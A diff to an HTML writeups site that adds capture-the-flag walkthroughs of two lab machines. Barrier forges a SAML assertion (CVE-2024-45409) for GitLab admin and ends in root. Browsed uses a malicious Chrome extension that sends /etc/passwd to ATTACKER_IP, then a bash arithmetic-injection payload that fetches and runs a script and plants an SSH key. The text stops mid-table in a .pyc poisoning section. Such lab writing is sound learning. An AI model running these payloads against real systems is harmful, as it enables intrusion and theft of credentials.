@@ -697,7 +697,7 @@ a { color: inherit; text-decoration: none; }
           <span class="folder-arrow">&#9654;</span>
           <span class="folder-icon">&#128193;</span>
           <span>HTB</span>
-          <span class="folder-count">8</span>
+          <span class="folder-count">13</span>
         </div>
         <div class="folder-children">
           <div class="file-entry active" data-post="htb-kotarak" onclick="openPost('htb-kotarak', this)">
@@ -730,6 +730,21 @@ a { color: inherit; text-decoration: none; }
             VariaType
             <span class="file-difficulty diff-medium">Med</span>
           </div>
+          <div class="file-entry" data-post="htb-barrier" onclick="openPost('htb-barrier', this)">
+            <span class="file-icon">&#128196;</span>
+            Barrier
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-browsed" onclick="openPost('htb-browsed', this)">
+            <span class="file-icon">&#128196;</span>
+            Browsed
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-devarea" onclick="openPost('htb-devarea', this)">
+            <span class="file-icon">&#128196;</span>
+            DevArea &#128274;
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
           <div class="file-entry" data-post="htb-cctv" onclick="openPost('htb-cctv', this)">
             <span class="file-icon">&#128196;</span>
             CCTV
@@ -738,6 +753,16 @@ a { color: inherit; text-decoration: none; }
           <div class="file-entry" data-post="htb-facts" onclick="openPost('htb-facts', this)">
             <span class="file-icon">&#128196;</span>
             Facts
+            <span class="file-difficulty diff-easy">Easy</span>
+          </div>
+          <div class="file-entry" data-post="htb-kobold" onclick="openPost('htb-kobold', this)">
+            <span class="file-icon">&#128196;</span>
+            Kobold
+            <span class="file-difficulty diff-easy">Easy</span>
+          </div>
+          <div class="file-entry" data-post="htb-lame" onclick="openPost('htb-lame', this)">
+            <span class="file-icon">&#128196;</span>
+            Lame
             <span class="file-difficulty diff-easy">Easy</span>
           </div>
         </div>
@@ -761,10 +786,10 @@ a { color: inherit; text-decoration: none; }
       <!-- LANDING -->
       <div id="landing" style="display:none;">
         <div class="stats-row">
-          <div class="stat-mini"><div class="num">8</div><div class="lbl">Writeups</div></div>
+          <div class="stat-mini"><div class="num">13</div><div class="lbl">Writeups</div></div>
           <div class="stat-mini"><div class="num">2</div><div class="lbl">Hard</div></div>
-          <div class="stat-mini"><div class="num">4</div><div class="lbl">Medium</div></div>
-          <div class="stat-mini"><div class="num">2</div><div class="lbl">Easy</div></div>
+          <div class="stat-mini"><div class="num">7</div><div class="lbl">Medium</div></div>
+          <div class="stat-mini"><div class="num">4</div><div class="lbl">Easy</div></div>
         </div>
         <div class="welcome-card">
           <div class="wc-label">// m1st &mdash; writeups</div>
@@ -773,20 +798,20 @@ a { color: inherit; text-decoration: none; }
         </div>
         <div style="font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.75rem;">Recently viewed</div>
         <div class="recent-list">
-          <div class="recent-item" onclick="openPost('htb-facts', null)">
+          <div class="recent-item" onclick="openPost('htb-barrier', null)">
             <span class="post-badge badge-htb">HTB</span>
-            <span class="recent-item-title">Facts &mdash; Easy</span>
-            <span class="recent-item-meta">2026.03.18</span>
+            <span class="recent-item-title">Barrier &mdash; Medium</span>
+            <span class="recent-item-meta">2026.03.27</span>
           </div>
-          <div class="recent-item" onclick="openPost('htb-pterodactyl', null)">
+          <div class="recent-item" onclick="openPost('htb-browsed', null)">
             <span class="post-badge badge-htb">HTB</span>
-            <span class="recent-item-title">Pterodactyl &mdash; Medium</span>
-            <span class="recent-item-meta">2026.03.20</span>
+            <span class="recent-item-title">Browsed &mdash; Medium</span>
+            <span class="recent-item-meta">2026.03.26</span>
           </div>
-          <div class="recent-item" onclick="openPost('htb-kotarak', null)">
+          <div class="recent-item" onclick="openPost('htb-kobold', null)">
             <span class="post-badge badge-htb">HTB</span>
-            <span class="recent-item-title">Kotarak &mdash; Hard</span>
-            <span class="recent-item-meta">2026.03.15</span>
+            <span class="recent-item-title">Kobold &mdash; Easy</span>
+            <span class="recent-item-meta">2026.03.21</span>
           </div>
         </div>
       </div>
@@ -1394,6 +1419,723 @@ EOF</span>
       </div>
 
 
+      <!-- HTB: Barrier -->
+      <div class="content-pane" id="post-htb-barrier">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.27</span>
+        </div>
+        <h1 class="post-title">Barrier &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">gitlab</span>
+          <span class="post-tag">saml</span>
+          <span class="post-tag">cve-2024-45409</span>
+          <span class="post-tag">guacamole</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Barrier is a medium-difficulty Linux box centered on a SAML-integrated DevOps stack: GitLab CE, authentik (identity provider), and Apache Guacamole (remote access gateway). The attack chain begins with a credential leak in GitLab commit history, escalates through a critical SAML signature verification bypass (CVE-2024-45409) to gain GitLab admin, pivots through a CI/CD environment variable leak to compromise the identity provider, and ultimately reaches the host via SSH credentials stored in Guacamole&rsquo;s database.</p>
+
+          <h2>Reconnaissance</h2>
+          <p>A full TCP port scan revealed six services:</p>
+          <pre><span class="keyword">$</span> nmap -p- -sC -sV -T4 10.129.234.46</pre>
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+            <tbody>
+              <tr><td>22</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.13</td></tr>
+              <tr><td>80</td><td>HTTP</td><td>nginx (redirects to :443)</td></tr>
+              <tr><td>443</td><td>HTTPS</td><td>GitLab CE 17.3.2</td></tr>
+              <tr><td>8080</td><td>HTTP</td><td>Apache Tomcat 9.0.58</td></tr>
+              <tr><td>9000</td><td>HTTP</td><td>authentik 2024.10.5</td></tr>
+              <tr><td>9443</td><td>HTTPS</td><td>authentik 2024.10.5 (SSL)</td></tr>
+            </tbody>
+          </table>
+          <p>Key observations from the scan:</p>
+          <ul>
+            <li>The SSL certificate on port 443 disclosed the hostname <code>gitlab.barrier.vl</code></li>
+            <li>Port 80 redirected to <code>https://gitlab.barrier.vl:443/</code></li>
+            <li>Port 9000 identified itself as authentik via the <code>X-Powered-By: authentik</code> header, with version <code>2024.10.5</code> visible in JavaScript asset filenames</li>
+            <li>The authentik <code>/api/v3/root/config/</code> endpoint was accessible unauthenticated, revealing capabilities including <code>can_impersonate</code> and <code>is_enterprise</code></li>
+          </ul>
+          <p>After adding <code>gitlab.barrier.vl</code> and <code>barrier.vl</code> to <code>/etc/hosts</code>, the GitLab sign-in page confirmed SAML authentication was configured &mdash; a &ldquo;SAML login&rdquo; button was present alongside standard login. The GitLab metadata endpoint at <code>/users/auth/saml/metadata</code> confirmed the SAML Service Provider configuration with ACS URL at <code>/users/auth/saml/callback</code>.</p>
+          <p>The GitLab version was confirmed as <strong>17.3.2</strong> via the authenticated API endpoint <code>/api/v4/metadata</code>. This version is one patch behind 17.3.3, which is significant &mdash; 17.3.3 patched CVE-2024-45409.</p>
+
+          <h2>Enumeration</h2>
+          <h3>GitLab Credential Recovery</h3>
+          <p>The GitLab API revealed a public project at <code>/api/v4/projects</code>:</p>
+          <pre><span class="string">{"path_with_namespace": "satoru/gitconnect", "visibility": "public"}</span></pre>
+          <p>The repository contained a single file, <code>gitconnect.py</code> &mdash; a Python script that authenticates to GitLab via OAuth. The current version had the password redacted:</p>
+          <pre>auth_data = {
+    'grant_type': 'password',
+    'username': 'satoru',
+    'password': '***'
+}</pre>
+          <p>But the commit history told a different story. The initial commit (<code>a8e43e54</code>) contained the plaintext password:</p>
+          <pre><span class="keyword">$</span> curl -sk 'https://gitlab.barrier.vl/api/v4/projects/1/repository/files/gitconnect.py/raw?ref=a8e43e54'
+
+<span class="string">'password': 'dGJ2V72SUEMsM3Ca'</span></pre>
+          <p>Verified immediately via OAuth:</p>
+          <pre><span class="keyword">$</span> curl -sk -X POST 'https://gitlab.barrier.vl/oauth/token' \
+  -d 'grant_type=password&amp;username=satoru&amp;password=dGJ2V72SUEMsM3Ca'
+<span class="comment"># Returns access_token &mdash; confirmed valid</span></pre>
+
+          <h3>SAML Identity Confirmation</h3>
+          <p>Using satoru&rsquo;s OAuth token to query the user profile revealed a critical detail:</p>
+          <pre><span class="string">"identities": [{"provider": "saml", "extern_uid": "satoru"}]</span></pre>
+          <p>satoru had a linked SAML identity through authentik. This meant:</p>
+          <ul>
+            <li>SAML authentication was actively configured between authentik and GitLab</li>
+            <li>A legitimate SAML flow could be completed using satoru&rsquo;s credentials</li>
+            <li>The signed SAMLResponse from that flow would be the raw material for CVE-2024-45409</li>
+          </ul>
+
+          <h3>GitLab User Enumeration</h3>
+          <p>With authenticated access, user enumeration revealed the admin account:</p>
+          <pre><span class="keyword">$</span> curl -sk -H "Authorization: Bearer $TOKEN" 'https://gitlab.barrier.vl/api/v4/users?per_page=100'</pre>
+          <table>
+            <thead><tr><th>ID</th><th>Username</th><th>Role</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td>akadmin</td><td>Admin</td></tr>
+              <tr><td>2</td><td>satoru</td><td>User</td></tr>
+            </tbody>
+          </table>
+          <p>The admin was <code>akadmin</code> &mdash; not the GitLab default <code>root</code>. This username matches authentik&rsquo;s default admin, suggesting the same person set up both services.</p>
+
+          <h3>CI/CD Runner Discovery</h3>
+          <pre><span class="keyword">$</span> curl -sk -H "Authorization: Bearer $TOKEN" 'https://gitlab.barrier.vl/api/v4/projects/1/runners'</pre>
+          <p>A shared instance runner existed (ID 1) but was <strong>paused</strong>. Only an admin could unpause it. This established the exploitation objective: GitLab admin access would unlock CI/CD code execution.</p>
+
+          <h2>Foothold &mdash; CVE-2024-45409: SAML Signature Verification Bypass</h2>
+          <h3>The Vulnerability</h3>
+          <p>CVE-2024-45409 (CVSS 9.8) affects ruby-saml versions up to 1.16.0, used by GitLab CE/EE before 17.3.3.</p>
+          <p>The vulnerability is in how ruby-saml verifies XML digital signatures on SAML assertions. During signature verification, the library needs to locate the <code>&lt;ds:DigestValue&gt;</code> element to compare against the computed digest of the signed assertion. It uses an XPath query to find this element &mdash; but XPath&rsquo;s selection returns the <strong>first matching element in document order</strong>, not necessarily the one inside the legitimate <code>&lt;ds:Reference&gt;</code>.</p>
+          <p>This means an attacker can:</p>
+          <ul>
+            <li>Take a legitimately signed SAML response from the IdP</li>
+            <li>Inject a forged <code>&lt;ds:DigestValue&gt;</code> element <strong>earlier</strong> in the XML document (e.g., inside <code>&lt;samlp:StatusDetail&gt;</code>)</li>
+            <li>Modify the assertion content &mdash; change the NameID to any target user</li>
+            <li>Compute the correct digest for the modified assertion and place it in the injected element</li>
+            <li>ruby-saml&rsquo;s XPath query finds the injected digest first, validates it against the tampered assertion, and declares the signature valid</li>
+          </ul>
+          <p>The original signature remains untouched in the document. The library simply checks the wrong digest.</p>
+
+          <h3>Step 1 &mdash; Capture a Legitimate SAMLResponse</h3>
+          <p>To get a signed SAML document from authentik, I authenticated as satoru through the full SAML flow:</p>
+          <ul>
+            <li>Navigated to GitLab&rsquo;s sign-in page</li>
+            <li>Clicked the SAML login button (POST to <code>/users/auth/saml</code>)</li>
+            <li>Was redirected to authentik&rsquo;s authentication flow</li>
+            <li>Authenticated as <code>satoru</code> / <code>dGJ2V72SUEMsM3Ca</code></li>
+            <li>Approved the consent prompt</li>
+          </ul>
+          <p>authentik uses HTTP-Redirect binding, so the SAMLResponse appeared as a deflate-compressed, base64-encoded query parameter in the redirect URL back to GitLab. I captured this in Burp Suite and decoded it using Burp&rsquo;s Decoder (URL decode &rarr; Base64 decode &rarr; Inflate) to obtain the raw XML.</p>
+          <p>The SAMLResponse contained a signed assertion with <code>NameID=satoru</code>, the authentik signing certificate, and valid digest/signature values.</p>
+
+          <h3>Step 2 &mdash; Forge the Assertion</h3>
+          <p>Using the <a href="https://github.com/synacktiv/CVE-2024-45409">synacktiv CVE-2024-45409 PoC</a>:</p>
+          <pre><span class="keyword">$</span> git clone https://github.com/synacktiv/CVE-2024-45409.git
+<span class="keyword">$</span> python3 CVE-2024-45409.py -r saml_response.xml -o saml_forged.xml -n akadmin</pre>
+          <p>The PoC:</p>
+          <ul>
+            <li>Removes the signature from the response level and moves it into the assertion</li>
+            <li>Changes the assertion&rsquo;s NameID from <code>satoru</code> to <code>akadmin</code></li>
+            <li>Updates the NotOnOrAfter timestamps to prevent expiry</li>
+            <li>Computes a new digest for the modified assertion</li>
+            <li>Injects the new digest inside a <code>&lt;samlp:StatusDetail&gt;</code> element before the assertion</li>
+            <li>The original signature&rsquo;s <code>&lt;ds:Reference&gt;</code> still points at the assertion ID, but ruby-saml will find the injected digest first</li>
+          </ul>
+
+          <h3>Step 3 &mdash; Submit to GitLab</h3>
+          <pre><span class="comment"># Get a fresh GitLab session with SAML state</span>
+<span class="keyword">$</span> CSRF=$(curl -sk -c /tmp/cookies 'https://gitlab.barrier.vl/users/sign_in' | \
+  grep -oP 'csrf-token"\s+content="\K[^"]+')
+<span class="keyword">$</span> curl -sk -b /tmp/cookies -c /tmp/cookies -X POST \
+  'https://gitlab.barrier.vl/users/auth/saml' \
+  --data-urlencode "authenticity_token=$CSRF" -o/dev/null
+
+<span class="keyword">$</span> GL_SESSION=$(grep _gitlab_session /tmp/cookies | awk '{print $NF}')
+
+<span class="comment"># Submit the forged SAML response</span>
+<span class="keyword">$</span> SAML_B64=$(base64 -w0 saml_forged.xml)
+<span class="keyword">$</span> curl -sk -b "_gitlab_session=$GL_SESSION" \
+  -X POST 'https://gitlab.barrier.vl/users/auth/saml/callback' \
+  --data-urlencode "SAMLResponse=$SAML_B64" \
+  -D- -o/dev/null</pre>
+          <p>Response:</p>
+          <pre><span class="string">HTTP/2 302
+location: https://gitlab.barrier.vl/
+set-cookie: _gitlab_session=1e86d0274f470e15a3067710c1682d75; ...
+set-cookie: known_sign_in=...; ...</span></pre>
+          <p>Verification:</p>
+          <pre><span class="keyword">$</span> curl -sk -b '_gitlab_session=1e86d0274f470e15a3067710c1682d75' \
+  'https://gitlab.barrier.vl/api/v4/user'
+
+<span class="string">{"username": "akadmin", "id": 1, "is_admin": true, "email": "admin@barrier.vl"}</span></pre>
+          <p><strong>GitLab admin achieved.</strong></p>
+
+          <h2>Privilege Escalation: User</h2>
+          <h3>CI/CD Environment Variable Leak</h3>
+          <p>As GitLab admin, I unpaused the shared CI/CD runner:</p>
+          <pre><span class="keyword">$</span> curl -sk -b "_gitlab_session=$SESSION" -X PUT \
+  'https://gitlab.barrier.vl/api/v4/runners/1' \
+  -H 'Content-Type: application/json' \
+  -H "X-CSRF-Token: $CSRF" \
+  -d '{"paused":false}'</pre>
+          <p>The runner was a Docker executor with no internet access (DNS timeout to Docker Hub). After several failed image pulls, I used the locally cached <code>gitlab/gitlab-ce:17.3.2-ce.0</code> image &mdash; the same image running GitLab itself.</p>
+          <p>Created a project and committed a minimal <code>.gitlab-ci.yml</code>:</p>
+          <pre>stages:
+  - build
+
+recon:
+  stage: build
+  tags:
+    - auto_5e7f
+  image: gitlab/gitlab-ce:17.3.2-ce.0
+  script:
+    - id
+    - env | sort</pre>
+          <p>The pipeline output revealed:</p>
+          <pre><span class="string">AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc</span></pre>
+
+          <h3>authentik Superadmin Access</h3>
+          <p>The leaked token was an authentik API key with superadmin privileges:</p>
+          <pre><span class="keyword">$</span> curl -s 'http://10.129.234.46:9000/api/v3/core/users/me/' \
+  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc"
+
+<span class="string">{"username": "akadmin", "is_superuser": true}</span></pre>
+
+          <h3>Guacamole Discovery</h3>
+          <p>Enumerating authentik&rsquo;s application registry revealed a second SAML-integrated application:</p>
+          <pre><span class="keyword">$</span> curl -s 'http://10.129.234.46:9000/api/v3/core/applications/' \
+  -H "Authorization: Bearer $AK_TOKEN"</pre>
+          <table>
+            <thead><tr><th>Application</th><th>SAML ACS URL</th></tr></thead>
+            <tbody>
+              <tr><td>Gitlab</td><td><code>https://gitlab.barrier.vl/users/auth/saml/callback</code></td></tr>
+              <tr><td>Guacamole</td><td><code>http://barrier.vl:8080/guacamole/api/ext/saml/callback</code></td></tr>
+            </tbody>
+          </table>
+          <p>Port 8080 &mdash; which we&rsquo;d identified as &ldquo;Apache Tomcat&rdquo; &mdash; was actually hosting <strong>Apache Guacamole</strong>, a remote desktop/SSH gateway. The Tomcat default page had hidden the deployed application at <code>/guacamole/</code>.</p>
+
+          <h3>Guacamole to SSH</h3>
+          <p>Created an authentik admin account to access Guacamole:</p>
+          <pre><span class="comment"># Create user</span>
+<span class="keyword">$</span> curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/users/' \
+  -H "Authorization: Bearer $AK_TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"operator","name":"operator","is_active":true,"email":"operator@barrier.vl"}'
+
+<span class="comment"># Add to admin group</span>
+<span class="keyword">$</span> curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/groups/&lt;admin-group-uuid&gt;/add_user/' \
+  -H "Authorization: Bearer $AK_TOKEN" \
+  -d '{"pk": 36}'
+
+<span class="comment"># Set password</span>
+<span class="keyword">$</span> curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/users/36/set_password/' \
+  -H "Authorization: Bearer $AK_TOKEN" \
+  -d '{"password":"Operator123!"}'</pre>
+          <p>Logged into Guacamole via SAML at <code>http://barrier.vl:8080/guacamole/</code>. Guacamole&rsquo;s MySQL database (<code>guac_user:guac2024</code> from <code>guacamole.properties</code>) stored SSH connection parameters in plaintext:</p>
+          <table>
+            <thead><tr><th>Parameter</th><th>Value</th></tr></thead>
+            <tbody>
+              <tr><td>username</td><td><code>maki_adm</code></td></tr>
+              <tr><td>port</td><td><code>22</code></td></tr>
+              <tr><td>passphrase</td><td><code>3V32FN6oViMPxyzC</code></td></tr>
+              <tr><td>private-key</td><td>RSA key (AES-128-CBC encrypted)</td></tr>
+            </tbody>
+          </table>
+          <pre><span class="keyword">$</span> ssh -i maki_adm.key -o HostKeyAlgorithms=+ssh-rsa maki_adm@10.129.234.46
+<span class="comment"># Passphrase: 3V32FN6oViMPxyzC</span>
+
+<span class="string">uid=1002(maki_adm) gid=1002(admin) groups=1002(admin)</span></pre>
+          <p><strong>User shell on the host.</strong></p>
+
+          <h2>Privilege Escalation: Root</h2>
+          <p>The <code>.bash_history</code> file in maki_adm&rsquo;s home directory contained:</p>
+          <pre>sudo su
+Va4kSjgTHSd55ZLv</pre>
+          <p>The user had typed their sudo password as a command &mdash; they likely hit Enter before the password prompt appeared. This is a common mistake with slow SSH sessions.</p>
+          <pre><span class="keyword">$</span> echo "Va4kSjgTHSd55ZLv" | sudo -S id
+<span class="string"># uid=0(root) gid=0(root) groups=0(root)</span></pre>
+          <p><strong>Root.</strong></p>
+
+          <div class="flag-box">&#127987; user.txt + root.txt captured.</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Git history is permanent.</strong> Redacting a credential in a subsequent commit does nothing &mdash; the original commit is still accessible via the API. Force-push with history rewrite or rotate the credential immediately.</li>
+            <li><strong>SAML signature verification is subtle and dangerous.</strong> CVE-2024-45409 isn&rsquo;t about a missing check &mdash; the signature IS verified. The bug is that XPath selects the wrong element. Defenders should upgrade ruby-saml and monitor SAML callback logs for assertions with mismatched NameIDs or unusual XML structures.</li>
+            <li><strong>CI/CD environment variables are a lateral movement goldmine.</strong> The AUTHENTIK_TOKEN had no business being in a runner&rsquo;s environment. Secrets injected into CI/CD pipelines are accessible to anyone who can trigger a build &mdash; which on a shared runner means any project on the instance.</li>
+            <li><strong>Tomcat default pages hide deployed applications.</strong> Port 8080 showed the Tomcat welcome page, but Guacamole was running at <code>/guacamole/</code>. A single directory enumeration would have found it during recon instead of discovering it indirectly through authentik&rsquo;s application registry.</li>
+            <li><strong>Remote access gateways store credentials.</strong> Guacamole, similar to tools like RoyalTS or mRemoteNG, stores connection credentials in its database. Compromising the gateway&rsquo;s backend gives you every credential it manages &mdash; often including privileged service accounts.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: Browsed -->
+      <div class="content-pane" id="post-htb-browsed">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.26</span>
+        </div>
+        <h1 class="post-title">Browsed &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">chrome-extension</span>
+          <span class="post-tag">bash-eval</span>
+          <span class="post-tag">pyc-poisoning</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Browsed is a Linux box running a Chrome extension review platform. A malicious Manifest V3 extension is used to enumerate internal services from Chrome&rsquo;s context, revealing a Gitea instance and an internal Flask application. The Flask app passes user input to a bash script that uses <code>[[ "$1" -eq 0 ]]</code> &mdash; exploitable through bash arithmetic evaluation to achieve RCE as <code>larry</code>. Privilege escalation abuses a world-writable <code>__pycache__</code> directory to poison a Python <code>.pyc</code> module loaded by a sudo-permitted script, gaining root.</p>
+
+          <h2>Reconnaissance</h2>
+          <p>A full TCP scan reveals a minimal attack surface:</p>
+          <pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
+80/tcp open  http    nginx 1.24.0 (Ubuntu)</pre>
+          <p>The web application at port 80 is a company called &ldquo;Browsed&rdquo; (<code>browsed.htb</code>) that develops Chrome extensions. WhatWeb confirms nginx/1.24.0 serving static HTML5 with jQuery.</p>
+
+          <h2>Enumeration</h2>
+          <p>The site has three interesting pages:</p>
+          <ul>
+            <li><strong><code>/</code></strong> &mdash; Landing page. States the company accepts Chrome version 134 extensions, uploaded as <code>.zip</code> files with contents directly in the archive root (no subfolder).</li>
+            <li><strong><code>/samples.html</code></strong> &mdash; Three sample extensions available for download: Fontify, ReplaceImages, Timer. Downloading Fontify reveals the expected format: Manifest V3 with <code>content_scripts</code> on <code>&lt;all_urls&gt;</code>.</li>
+            <li><strong><code>/upload.php</code></strong> &mdash; Upload form (<code>name="extension"</code>, <code>accept=".zip"</code>). After upload, a JavaScript <code>pollOutput()</code> function fetches results from <code>upload.php?output=1</code>. The page says: <em>&ldquo;A developer will use it and reach back with some feedback.&rdquo;</em></li>
+          </ul>
+          <p>This tells us that uploaded extensions are loaded into a real Chrome instance on the server, and console output is captured and returned.</p>
+
+          <h2>Foothold</h2>
+          <h3>Phase 1: Malicious Chrome Extension as Recon Tool</h3>
+          <p>The first malicious extension used a Manifest V3 background service worker that fires <code>chrome.runtime.onInstalled</code>. On the initial upload, the server&rsquo;s HTTP response leaked the Chrome command line:</p>
+          <pre><span class="string">timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
+  --load-extension="/tmp/extension_..." \
+  --enable-logging=stderr --v=1 \
+  http://localhost/ http://browsedinternals.htb</span></pre>
+          <p>Key observations:</p>
+          <ul>
+            <li>Chrome runs headless with <code>--no-sandbox</code></li>
+            <li>It navigates to <code>http://localhost/</code> and <strong><code>http://browsedinternals.htb</code></strong> &mdash; an internal vhost</li>
+            <li>Console output is captured via <code>--enable-logging=stderr --v=1</code></li>
+            <li>Extensions run as <code>www-data</code></li>
+            <li>Process has a 10-second timeout</li>
+          </ul>
+          <p>Chrome&rsquo;s verbose logging truncates <code>console.log()</code> output, so network exfiltration was used instead &mdash; the background service worker POSTed data to a Python HTTP listener on the attack box:</p>
+          <pre>async function exfil(label, data) {
+  try {
+    await fetch("http://ATTACKER_IP:9999/" + encodeURIComponent(label), {
+      method: "POST",
+      body: data
+    });
+  } catch(e) {}
+}
+
+chrome.runtime.onInstalled.addListener(async () =&gt; {
+  <span class="comment">// Read local files via file:// protocol</span>
+  const r = await fetch("file:///etc/passwd");
+  await exfil("passwd", await r.text());
+
+  <span class="comment">// Enumerate internal services</span>
+  const r2 = await fetch("http://127.0.0.1:3000/api/v1/repos/search?limit=50");
+  await exfil("repos", await r2.text());
+});</pre>
+          <p>The extension&rsquo;s service worker, running in Chrome with <code>--no-sandbox</code>, can read local files via <code>file://</code> URLs and access internal services. This revealed:</p>
+          <table>
+            <thead><tr><th>Finding</th><th>Detail</th></tr></thead>
+            <tbody>
+              <tr><td><code>/etc/passwd</code></td><td>User <code>larry</code> (uid 1000) has shell access</td></tr>
+              <tr><td><code>127.0.0.1:3000</code></td><td><strong>Gitea 1.24.5</strong> instance (<code>browsedinternals.htb</code>)</td></tr>
+              <tr><td><code>127.0.0.1:5000</code></td><td><strong>Flask</strong> application (Markdown Previewer)</td></tr>
+              <tr><td>Gitea user</td><td><code>larry</code> &mdash; single user, one public repo</td></tr>
+              <tr><td>Gitea repo</td><td><code>larry/MarkdownPreview</code> &mdash; Python Flask app</td></tr>
+            </tbody>
+          </table>
+
+          <h3>Phase 2: Source Code Exfiltration</h3>
+          <p>The extension fetched repo contents via Gitea&rsquo;s API (<code>/api/v1/repos/larry/MarkdownPreview/raw/{file}?ref=main</code>), revealing:</p>
+          <p><strong>app.py</strong> &mdash; Flask app on port 5000 (localhost only):</p>
+          <pre>@app.route('/routines/&lt;rid&gt;')
+def routines(rid):
+    subprocess.run(["./routines.sh", rid])
+    return "Routine executed !"</pre>
+          <p><strong>routines.sh</strong> &mdash; Bash script with arithmetic comparisons:</p>
+          <pre>if [[ "$1" -eq 0 ]]; then
+  <span class="comment"># Routine 0: Clean temp files</span>
+  ...
+elif [[ "$1" -eq 1 ]]; then
+  <span class="comment"># Routine 1: Backup data</span>
+  ...
+fi</pre>
+
+          <h3>Phase 3: Bash Arithmetic Evaluation RCE</h3>
+          <p>The vulnerability is in bash&rsquo;s <code>[[ "$1" -eq 0 ]]</code> construct. The bash manual states:</p>
+          <blockquote>When used with the <code>[[</code> command, [arithmetic binary operator] Arg1 and Arg2 are evaluated as arithmetic expressions.</blockquote>
+          <p>In bash&rsquo;s arithmetic evaluation, array subscript expressions are recursively evaluated, including command substitutions. This means a payload like <code>a[$(command)]</code> passed as <code>$1</code> will be interpreted as: variable <code>a</code> with subscript <code>$(command)</code> &mdash; and the <code>$(command)</code> is executed.</p>
+          <p>The <code>subprocess.run(["./routines.sh", rid])</code> call uses list form (no <code>shell=True</code>), which safely passes <code>rid</code> as a single argument &mdash; but bash&rsquo;s own arithmetic evaluator re-interprets it.</p>
+          <div class="callout">
+            <div class="callout-label">Note</div>
+            The payload travels through a Flask URL path (<code>/routines/&lt;rid&gt;</code>). Flask decodes <code>%2F</code> to <code>/</code>, splitting the path into multiple segments that don&rsquo;t match the route. The payload must not contain forward slashes.
+          </div>
+          <p><strong>Proof of concept:</strong></p>
+          <pre>Payload:  a[$(curl ATTACKER_IP:9999)]
+URL:      http://127.0.0.1:5000/routines/a%5B%24%28curl%20ATTACKER_IP%3A9999%29%5D</pre>
+          <p>The first test confirmed RCE: the target connected to the listener.</p>
+          <p><strong>SSH key plant &mdash; two-step delivery:</strong></p>
+          <p>Since <code>curl ATTACKER_IP:9999|bash</code> contains no slashes, the pipe-to-bash approach works. The listener serves a shell script on any GET request:</p>
+          <pre><span class="comment">#!/bin/bash</span>
+mkdir -p $HOME/.ssh
+echo 'ssh-ed25519 AAAA...' &gt;&gt; $HOME/.ssh/authorized_keys
+chmod 700 $HOME/.ssh
+chmod 600 $HOME/.ssh/authorized_keys</pre>
+          <p>The extension triggers the Flask endpoint:</p>
+          <pre><span class="comment">// Download and execute in two separate calls</span>
+fetch("http://127.0.0.1:5000/routines/a%5B%24%28curl%20-o%20.x.sh%2010.10.14.91%3A9999%29%5D");
+fetch("http://127.0.0.1:5000/routines/a%5B%24%28bash%20.x.sh%29%5D");</pre>
+          <pre><span class="keyword">$</span> ssh -i browsed_key larry@10.129.244.79
+<span class="keyword">$</span> id
+<span class="string">uid=1000(larry) gid=1000(larry) groups=1000(larry)</span></pre>
+
+          <h2>Privilege Escalation: Root</h2>
+          <h3>Enumeration</h3>
+          <pre><span class="keyword">$</span> sudo -l
+<span class="string">User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py</span></pre>
+          <p>The script is a Python 3.12 tool for managing Chrome extensions. It imports a local module:</p>
+          <pre><span class="comment">#!/usr/bin/python3.12</span>
+from extension_utils import validate_manifest, clean_temp_files</pre>
+          <p>Directory permissions:</p>
+          <pre>drwxr-xr-x  /opt/extensiontool/
+-rwxrwxr-x  extension_tool.py      (root:root)
+-rw-rw-r--  extension_utils.py     (root:root)
+<span class="string">drwxrwxrwx  __pycache__/           (root:root)  &larr; WORLD-WRITABLE</span></pre>
+          <p>Larry cannot modify the source files (root:root, not in root group), but <code>__pycache__</code> is world-writable and currently empty.</p>
+
+          <h3>Python .pyc Cache Poisoning</h3>
+          <p>Python caches compiled bytecode in <code>__pycache__/</code>. When importing a module, Python checks if a valid <code>.pyc</code> file exists with a timestamp matching the source file&rsquo;s mtime. If it matches, Python loads the cached bytecode directly &mdash; skipping the source file entirely.</p>
+          <p>The <code>.pyc</code> header format (Python 3.8+):</p>
+          <table>
